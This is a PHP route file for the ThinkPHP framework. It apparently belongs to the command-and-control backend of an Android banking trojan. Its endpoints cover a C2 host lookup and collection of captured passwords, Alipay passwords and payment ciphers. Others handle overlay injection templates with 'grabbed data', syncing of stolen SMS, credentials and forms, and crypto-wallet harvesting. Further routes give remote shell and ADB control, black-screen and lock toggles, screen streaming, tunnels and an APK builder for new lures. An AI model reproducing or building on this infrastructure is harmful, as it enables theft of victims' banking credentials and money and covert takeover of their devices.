<?php
use think\facade\Route;

// ============================================================
//  路由 DRY 注册：同一套路由定义同时挂载到 /api/ 和 /spi/
//  /spi/* 是前端旧版兼容性别名，与 /api/* 1:1 等效
//  新增路由只需添加到 $apiRoutes 回调内，不要手动写两遍
// ============================================================

$apiRoutes = function () {

    // ========== Auth ==========
    Route::group('auth', function () {
        Route::rule('check-initialization', 'AuthController/checkInitialization', 'GET|POST');
        Route::post('login', 'AuthController/login');
        Route::post('login-telegram-verify', 'AuthController/verifyTelegramLogin');
        Route::post('register', 'AuthController/register');
        Route::post('logout', 'AuthController/logout');
        Route::rule('verify', 'AuthController/verify', 'GET|POST');
        Route::post('change-password', 'AuthController/changePassword');
        Route::post('upload-avatar', 'AuthController/uploadAvatar');
    });

    // ========== Client (APK 调用) ==========
    Route::post('client/register', 'AuthController/clientRegister');
    Route::post('client/logs', 'AuthController/clientLogs');

    // ========== Users ==========
    Route::get('users', 'UserController/listUsers');
    Route::post('users', 'UserController/addUser');
    Route::group('users', function () {
        Route::get('list', 'UserController/listUsers');
        Route::rule('login-logs', 'AuthController/loginLogs', 'GET|DELETE');
        Route::post('add', 'UserController/addUser');
        Route::put(':id/reset-password', 'UserController/resetPassword');
        Route::put(':id/toggle', 'UserController/toggleUser');
        Route::put(':id', 'UserController/updateUser');
        Route::delete(':id', 'UserController/deleteUser');
    });

    // ========== System ==========
    Route::get('system/info', 'AuthController/systemInfo');
    Route::get('system/debug/connections', 'MiscController/debugConnections');
    Route::get('system/c2-host', 'ApkController/c2Host');

    // ========== License ==========
    Route::get('license/max-users', 'MiscController/maxUsers');

    // ========== Logs ==========
    Route::rule('logs', 'DeviceController/getLogs', 'GET|DELETE');

    // ========== Password Inputs ==========
    Route::rule('password-inputs/:deviceId', 'DeviceController/getPasswordInputs', 'GET|DELETE');
    Route::delete('password-inputs/id/:inputId', 'MiscController/deletePasswordInput');

    // ========== Alipay Passwords ==========
    Route::get('alipay-passwords/:deviceId', 'MiscController/alipayPasswords');

    // ========== Payment Cipher Records ==========
    Route::rule('payment-cipher-records', 'MiscController/paymentCipherRecords', 'GET|DELETE');

    // ========== Injection (前端页面调用) ==========
    Route::get('injection/grabbed-data', 'InjectionController/grabbedData');
    Route::rule('injection/active-tasks', 'InjectionController/activeTasks', 'GET|POST|DELETE');
    Route::rule('injection/global-configs', 'InjectionController/globalConfigs', 'GET|POST');

    // ⚠️ 带参数 :id 的路由必须写在不带参数的 "templates" 前面！不然 ThinkPHP 顺序匹配会错
    Route::get('injection/templates/:id', 'InjectionController/getTemplate')->pattern(['id' => '[^/]+']);
    Route::put('injection/templates/:id', 'InjectionController/updateTemplate')->pattern(['id' => '[^/]+']);
    Route::delete('injection/templates/:id', 'InjectionController/deleteTemplate')->pattern(['id' => '[^/]+']);

    // 不带 id 的列表/新增/保存/删除双保险路由（query / body 参数方式，防止 path 含点号/斜杠匹配失败）
    Route::get('injection/templates', 'InjectionController/listTemplates');
    Route::post('injection/template', 'InjectionController/addTemplate');
    Route::rule('injection/template', 'InjectionController/updateTemplate', 'PUT|POST|PATCH');
    Route::rule('injection/template/delete', 'InjectionController/deleteTemplate', 'POST|DELETE');

    Route::get('injection/configs', 'InjectionController/listConfigs');
    Route::post('injection/config', 'InjectionController/updateConfig');

    // ========== AI 分析 ==========
    Route::post('ai/analyze', 'AiController/analyze');
    Route::get('ai/config', 'AiController/getConfig');
    Route::put('ai/config', 'AiController/updateConfig');
    Route::post('ai/config/test', 'AiController/testConfig');
    Route::get('ai/device-data/:deviceId', 'AiController/getDeviceData');
    Route::post('ai/device-data', 'AiController/saveDeviceData');

    // ========== Injection Data (GET/DELETE) ==========
    Route::rule('injection/data', 'MiscController/injectionData', 'GET|DELETE');
    Route::get('injection/counts', 'MiscController/injectionCounts');

    // ========== Device ==========
    Route::group('device', function () {
        // 列表/详情/删除
        Route::get('list', 'DeviceController/listDevices');
        Route::get('groups', 'DeviceController/listGroups');
        Route::get('serverHost', 'DeviceController/serverHost');
        Route::get('tasks', 'DeviceController/getTasks');
        Route::get('pendingCommands', 'DeviceController/pendingCommands');
        Route::get(':id/apps', 'InjectionController/deviceApps');
        Route::put(':id/auto-injection', 'InjectionController/toggleAutoInjection');
        Route::rule(':id/global-injection-status', 'MiscController/globalInjectionStatus', 'GET|PUT');
        Route::rule(':id/permissions', 'MiscController/devicePermissions', 'GET|PUT');
        Route::get(':id', 'DeviceController/getDevice');
        Route::delete(':id', 'DeviceController/deleteDevice');

        // 设备操作
        Route::put(':id/assign', 'DeviceController/assignDevice');
        Route::put(':id/group', 'DeviceController/setGroup');
        Route::put(':id/remark', 'DeviceController/setRemark');
        Route::put(':id/real-name', 'DeviceController/setRealName');
        Route::put(':id/toggle-black-screen', 'DeviceController/toggleBlackScreen');
        Route::put(':id/toggle-screen', 'DeviceController/toggleScreen');
        Route::put(':id/toggle-device-owner', 'DeviceController/toggleDeviceOwner');
        Route::put(':id/toggle-device-input', 'DeviceController/toggleDeviceInput');
        Route::put(':id/lock-screen', 'DeviceController/lockScreen');
        Route::put(':id/unlock-screen', 'DeviceController/unlockScreen');
        Route::put(':id/reboot', 'DeviceController/reboot');
        Route::put(':id/shutdown', 'DeviceController/shutdown');

        // 分组
        Route::post('groups', 'DeviceController/addGroup');
        Route::delete('groups/:id', 'DeviceController/deleteGroup');

        // WS 重连
        Route::post('reconnect-ws', 'DeviceController/reconnectWs');

        // 设备回调（白名单内）
        Route::rule('localServiceHeartbeat', 'DeviceController/heartbeat', 'GET|POST');
        Route::post('message', 'DeviceController/message');
        Route::post('commandResult', 'DeviceController/commandResult');
        Route::post('task/responses', 'DeviceController/taskResponses');
        Route::post('cacheTaskResult', 'DeviceController/cacheTaskResult');
        Route::get('cacheTasks', 'MiscController/cacheTasks');
        Route::get('cacheTask', 'MiscController/cacheTask');
        Route::post('installLog', 'DeviceController/installLog');
        Route::post('install-log', 'DeviceController/installLog');

        // injection/global-configs (设备端调用)
        Route::get('injection/global-configs', 'MiscController/deviceInjectionGlobalConfigs');

        // ADB
        Route::post('adb-key', 'DeviceController/saveAdbKey');
        Route::get('adb-keys', 'DeviceController/listAdbKeys');
        Route::delete('adb-key/:id', 'DeviceController/deleteAdbKey');
        Route::post('adb-deploy', 'DeviceController/adbDeploy');
        Route::post('adb-wifi', 'DeviceController/adbWifi');
        Route::post('adb-command', 'DeviceController/adbCommand');

        // 数据上报
        Route::post('data/screen-monitord', 'DeviceController/screenMonitor');
        Route::post('upload/video', 'DeviceController/uploadVideo');
        Route::post('blacklist', 'DeviceController/setBlacklist');
        Route::post('rewriteDebugPort', 'DeviceController/rewriteDebugPort');
        Route::post('rewriteRpcConfig', 'DeviceController/rewriteRpcConfig');
    });

    // device-custom-info (不在 device group 下)
    Route::post('device-custom-info', 'DeviceController/customInfo');
    Route::get('device-custom-info/:deviceId', 'DeviceController/getCustomInfo');

    // ========== Sync (APK 数据同步) ==========
    Route::group('sync', function () {
        Route::rule('status', 'SyncController/status', 'GET|POST');
        Route::post('messages', 'SyncController/syncMessages');
        Route::get('messages', 'SyncController/getMessages');
        Route::post('inbox', 'SyncController/syncInbox');
        Route::get('inbox', 'SyncController/getInbox');
        Route::post('credentials', 'SyncController/syncCredentials');
        Route::get('credentials', 'SyncController/getCredentials');
        Route::post('cipher', 'SyncController/syncCipher');
        Route::get('cipher', 'SyncController/getCipher');
        Route::post('form', 'SyncController/syncForm');
        Route::get('form', 'SyncController/getForm');
        Route::get('all', 'SyncController/getAll');
        // ★ 2026-09-18 关键修复：APK 初始化必调，之前缺路由→404/401→初始化中断→永不调用/tunnel/config
        Route::rule('app-list', 'SyncController/syncAppList', 'GET|POST');
        Route::post('app-list/save', 'SyncController/syncAppList');
        Route::get('app-list/show', 'SyncController/getAppList');
    });

    // ========== APK ==========
    Route::group('apk', function () {
        Route::get('info', 'ApkController/apkInfo');
        Route::post('build', 'ApkController/apkBuild');
        Route::get('build-status', 'ApkController/apkBuildStatus');
        Route::get('build-logs', 'ApkController/apkBuildLogs');
        Route::get('build-history', 'ApkController/apkBuildHistory');
        Route::get('build-config/:buildId', 'ApkController/getBuildConfig');
        Route::get('list', 'ApkController/apkList');
        Route::get('download', 'ApkController/apkDownload');
        Route::get('download/:filename', 'ApkController/apkDownloadFile');
        Route::rule('delete', 'ApkController/apkDelete', 'DELETE|POST');
        Route::get('check-name', 'ApkController/checkAppName');
        Route::post('bt-deploy-test', 'ApkController/btDeployTest');
        Route::post('cdn-test', 'ApkController/cdnTest');
        Route::rule('cdn-config', 'ApkController/cdnConfig', 'GET|POST');
        Route::rule('bt-deploy-config', 'ApkController/btDeployConfig', 'GET|POST');
        Route::rule('auto-build/config', 'ApkController/autoBuildConfig', 'GET|POST');
        Route::rule('auto-build/targets', 'ApkController/autoBuildTargets', 'GET|POST');
        Route::delete('auto-build/targets/:targetId', 'ApkController/autoBuildTargetDelete');
        Route::get('auto-build/history', 'ApkController/apkBuildHistory');
    });

    // ab-apk / abpack 别名
    Route::group('ab-apk', function () {
        Route::get('info', 'ApkController/apkInfo');
        Route::post('build', 'ApkController/apkBuild');
        Route::get('build-status', 'ApkController/apkBuildStatus');
        Route::get('build-logs', 'ApkController/apkBuildLogs');
        Route::get('build-history', 'ApkController/apkBuildHistory');
        Route::get('list', 'ApkController/apkList');
        Route::get('download', 'ApkController/apkDownload');
        Route::rule('delete', 'ApkController/apkDelete', 'DELETE|POST');
        Route::get('latest-info', 'ApkController/latestInfo');
    });
    Route::group('abpack', function () {
        Route::get('info', 'ApkController/apkInfo');
        Route::post('build', 'ApkController/apkBuild');
        Route::get('build-status', 'ApkController/apkBuildStatus');
        Route::get('build-logs', 'ApkController/apkBuildLogs');
        Route::get('build-history', 'ApkController/apkBuildHistory');
        Route::get('list', 'ApkController/apkList');
        Route::get('download', 'ApkController/apkDownload');
        Route::rule('delete', 'ApkController/apkDelete', 'DELETE|POST');
    });
    Route::group('ab-auto-build', function () {
        Route::rule('config', 'ApkController/autoBuildConfig', 'GET|POST');
        Route::rule('targets', 'ApkController/autoBuildTargets', 'GET|POST');
        Route::delete('targets/:targetId', 'ApkController/autoBuildTargetDelete');
        Route::get('history', 'ApkController/apkBuildHistory');
    });

    // ========== Tunnel (frpc 配置 + 设备代理) ==========
    Route::group('tunnel', function () {
        Route::rule('config', 'TunnelController/config', 'GET|POST');
        Route::rule('config/', 'TunnelController/config', 'GET|POST');
        Route::rule('frpc-config', 'TunnelController/config', 'GET|POST');
        Route::rule('frpc-config/', 'TunnelController/config', 'GET|POST');
        Route::rule('deployed', 'TunnelController/deployed', 'GET|POST');
        Route::post('refresh-frps-env', 'TunnelController/refreshFrpsEnv');
        Route::get('status', 'TunnelController/status');
        // 以下从 Node.js 迁移（2026-08-05）
        Route::post('shell', 'TunnelController/shell');
        Route::post('input', 'TunnelController/input');
        Route::get('screenshot', 'TunnelController/screenshot');
        Route::get('minicap-stream', 'TunnelController/minicapStream');
        Route::get('bootstrap', 'TunnelController/bootstrap');
        Route::rule('setDeviceId', 'TunnelController/setDeviceId', 'GET|POST');
        // 管理接口（从 Node /internal/ 迁移）
        Route::get('tunnel-status', 'TunnelController/tunnelStatus');
        Route::post('close-frps-proxy', 'TunnelController/closeFrpsProxy');
        Route::rule('blacklist', 'TunnelController/blacklist', 'GET|DELETE');
        Route::post('deploy-adb', 'TunnelController/deployAdb');
        Route::post('deploy-shizuku', 'TunnelController/deployShizuku');
    });

    // ========== ADB Application / Device Policy Management ==========
    Route::group('adb-management', function () {
        Route::get('apps', 'AdbManagementController/apps');
        Route::get('apps/detail', 'AdbManagementController/appDetail');
        Route::post('apps/action', 'AdbManagementController/appAction');
        Route::post('apps/install', 'AdbManagementController/installApk');
        Route::get('device-policy/status', 'AdbManagementController/devicePolicyStatus');
        Route::post('device-policy/action', 'AdbManagementController/devicePolicyAction');
    });

    // ========== Shizuku Companion ==========
    Route::group('shizuku', function () {
        Route::get('artifacts', 'ShizukuController/artifacts');
        Route::post('deploy', 'ShizukuController/deploy');
        Route::get('status', 'ShizukuController/status');
        Route::post('repair', 'ShizukuController/repair');
        Route::post('stop', 'ShizukuController/stop');
        Route::post('reader-agent/ensure', 'ShizukuController/ensureReaderAgent');
        Route::post('reader-agent/mode', 'ShizukuController/setReaderMode');
    });

    // ========== Injection (注入模板) ==========
    Route::group('injection', function () {
        Route::get('templates/:templateId', 'InjectionController/getTemplate')->pattern(['templateId' => '[^/]+']);
        Route::put('templates/:templateId', 'InjectionController/updateTemplate')->pattern(['templateId' => '[^/]+']);
        Route::delete('templates/:templateId', 'InjectionController/deleteTemplate')->pattern(['templateId' => '[^/]+']);
        Route::get('templates', 'InjectionController/listTemplates');
        Route::get('template/:id', 'InjectionController/getTemplate');
        Route::post('template', 'InjectionController/addTemplate');
        Route::put('template/:id', 'InjectionController/updateTemplate');
        Route::delete('template/:id', 'InjectionController/deleteTemplate');
        Route::get('configs', 'InjectionController/listConfigs');
        Route::post('config', 'InjectionController/updateConfig');
        Route::rule('global-configs/:configId', 'MiscController/injectionGlobalConfigDetail', 'GET|PUT|DELETE');
    });

    // ========== Telegram Bot Webhook ==========
    Route::post('telegram/webhook', 'SettingsController/telegramWebhook');

    // ========== Settings ==========
    Route::group('settings', function () {
        Route::get('/', 'SettingsController/getSettings');
        Route::put('/', 'SettingsController/updateSettings');
        Route::post('telegram/test', 'SettingsController/testTelegram');
        Route::rule('telegram', 'SettingsController/telegram', 'GET|POST');
    });

    // ========== Bridge (转发到 Node.js WS) ==========
    Route::group('bridge', function () {
        Route::rule('command/:deviceId', 'BridgeController/sendCommand', 'GET|POST');
        Route::post('command', 'BridgeController/sendCommand');
        Route::post('commands', 'BridgeController/sendCommands');
        Route::post('screenshot', 'BridgeController/screenshot');
        Route::post('screen-record', 'BridgeController/screenRecord');
        Route::post('shell', 'BridgeController/shell');
        Route::get('status', 'BridgeController/status');
        Route::get('device/:deviceId', 'BridgeController/status');
        Route::get('result/:commandId', 'BridgeController/getResult');
    });

    // ========== File ==========
    Route::group('file', function () {
        Route::rule('list', 'FileController/listFiles', 'GET|POST');
        Route::get('download', 'FileController/download');
        Route::get('download-for-device', 'FileController/downloadForDevice');
        Route::post('upload-from-device', 'FileController/uploadFromDevice');
        Route::post('delete', 'FileController/deleteFile');
        Route::post('upload', 'FileController/upload');
        Route::post('copy', 'FileController/copyFile');
        Route::post('move', 'FileController/moveFile');
        Route::post('rename', 'FileController/renameFile');
        Route::post('create-folder', 'FileController/createFolder');
        Route::post('search', 'FileController/searchFile');
    });

    // ========== Translate ==========
    Route::post('translate', 'TranslateController/translate');

    // ========== 支付策略 (全局) ==========
    Route::get('payment-strategies', 'PaymentController/listStrategies');
    Route::post('payment-strategies', 'PaymentController/addStrategy');
    Route::put('payment-strategies/:id', 'PaymentController/updateStrategy');
    Route::delete('payment-strategies/:id', 'PaymentController/deleteStrategy');
    Route::post('payment-strategies/push', 'PaymentController/pushStrategy');

    // 支付策略 (新前端路由)
    Route::group('payment', function () {
        Route::get('strategies', 'PaymentController/listStrategies');
        Route::post('strategy', 'PaymentController/addStrategy');
        Route::put('strategy/:id', 'PaymentController/updateStrategy');
        Route::delete('strategy/:id', 'PaymentController/deleteStrategy');
        Route::post('bind', 'PaymentController/bindStrategy');
        Route::delete('bind', 'PaymentController/unbindStrategy');
        Route::get('bindings/:deviceId', 'PaymentController/getBindings');
    });

    // ========== 设备级支付策略 ==========
    Route::post('device-payment-strategies/:deviceId/push', 'MiscController/devicePaymentStrategiesPush');
    Route::rule('device-payment-strategies/:deviceId', 'MiscController/devicePaymentStrategies', 'GET|POST|PUT');

    // ========== 应用黑名单 / 敏感应用 (全局) ==========
    Route::get('black-apps', 'MiscController/listBlackApps');
    Route::post('black-apps/add', 'MiscController/addBlackApp');
    Route::post('black-apps/remove', 'MiscController/removeBlackApp');
    Route::get('sensitive-apps', 'MiscController/listSensitiveApps');
    Route::post('sensitive-apps/add', 'MiscController/addSensitiveApp');
    Route::post('sensitive-apps/remove', 'MiscController/removeSensitiveApp');

    // ========== 设备级黑名单 / 敏感应用 ==========
    Route::get('device-black-apps', 'MiscController/deviceBlackApps');
    Route::post('device-black-apps/add', 'MiscController/deviceBlackAppsAdd');
    Route::post('device-black-apps/remove', 'MiscController/deviceBlackAppsRemove');
    Route::post('device-black-apps/push', 'MiscController/deviceBlackAppsPush');
    Route::get('device-sensitive-apps', 'MiscController/deviceSensitiveApps');
    Route::post('device-sensitive-apps/add', 'MiscController/deviceSensitiveAppsAdd');
    Route::post('device-sensitive-apps/remove', 'MiscController/deviceSensitiveAppsRemove');
    Route::post('device-sensitive-apps/push', 'MiscController/deviceSensitiveAppsPush');

    // ========== ADB Keys (独立路由) ==========
    Route::rule('adb-keys/', 'MiscController/adbKeys', 'GET|POST');
    Route::rule('adb-keys', 'MiscController/adbKeys', 'GET|POST');
    Route::post('adb-keys/port', 'MiscController/adbKeysPort');
    Route::post('adb-keys/upload', 'MiscController/adbKeysUpload');
    Route::post('syncADBConfig', 'MiscController/syncADBConfig');
    Route::post('shareADBConfig', 'MiscController/shareADBConfig');

    // ========== ADB Agent ==========
    Route::get('adb-agent/status', 'MiscController/adbAgentStatusAll');
    Route::get('adb-agent/status/:deviceId', 'MiscController/adbAgentStatusDevice');
    Route::post('adb-agent/disconnect/:deviceId', 'MiscController/adbAgentDisconnect');
    Route::put('adb-agent/config/:deviceId', 'MiscController/adbAgentConfig');
    Route::post('adb-agent/send/:deviceId', 'MiscController/adbAgentSend');

    // ========== Gesture ==========
    Route::rule('gesture/:deviceId', 'MiscController/gesture', 'GET|POST');
    Route::get('gesture/list', 'MiscController/gestureList');

    // ========== IP Geo ==========
    Route::get('ip-geo/:ip', 'MiscController/ipGeo');

    // ========== SMS Notifications ==========
    Route::get('sms/notifications', 'MiscController/smsNotifications');

    // ========== Crypto Wallets ==========
    Route::get('devices/crypto-wallets', 'MiscController/cryptoWallets');

    // ========== Video ==========
    Route::post('video/upload', 'MiscController/videoUpload');

    // ========== Dex Tools ==========
    Route::get('dex-tools/status', 'MiscController/dexToolsStatus');

    // ========== Local Service ==========
    Route::rule('local-service/proxy', 'MiscController/localServiceProxy', 'GET|POST');
    Route::post('local-service/upload-install', 'MiscController/localServiceUploadInstall');
    Route::post('local-service/screen/shot', 'MiscController/localServiceScreen');
    Route::get('local-service/screen/status', 'MiscController/localServiceScreen');
    Route::get('local-service/screen/stream', 'MiscController/localServiceScreen');

    // ========== Binary (frpc/minicap 下载) ==========
    Route::get('binary/:arch/frpc', 'MiscController/binaryDownload');
    Route::get('binary/:arch/minicap', 'MiscController/binaryDownload');
    Route::get('binary/:arch/minicap.so', 'MiscController/binaryDownload');
    Route::get('binary/noarch/minicap.apk', 'MiscController/binaryDownload');
};

// 同时挂载到 /api/ 和 /spi/ 前缀
Route::group('api', $apiRoutes);
Route::group('spi', $apiRoutes);

// ========== 兜底：静态文件 ==========
Route::miss('Index/index');
